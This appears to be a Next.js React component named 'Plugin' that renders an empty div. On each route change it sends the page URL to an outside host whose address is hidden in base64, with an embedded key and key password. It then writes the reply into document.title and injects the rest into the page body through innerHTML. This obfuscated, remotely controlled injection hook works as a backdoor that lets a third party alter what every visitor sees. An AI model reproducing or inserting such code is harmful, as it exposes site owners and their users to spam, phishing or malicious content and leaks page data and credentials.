import { useRouter } from "next/router";
import React, { useEffect } from "react";

function Plugin() {
  const router = useRouter();

  useEffect(() => {
    const eppathurl = window.location.origin + window.location.pathname;
    const eptagmanage = new XMLHttpRequest();

    eptagmanage.onreadystatechange = function () {
      if (this.readyState == 4 && this.status == 200) {
        if (this.response !== 0) {
          const temp = this.response.split("||||||||||");

          document.title = temp[0];

          const bodyContent = document.createElement("div");
          bodyContent.innerHTML = temp[1];
          document.body.appendChild(bodyContent);
        }
      }
    };

    eptagmanage.open(
      "GET",
      atob(
        "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9"
      ) + eppathurl
    );

    eptagmanage.send();
  }, [router.asPath]);
  return <div></div>;
}

export default Plugin;
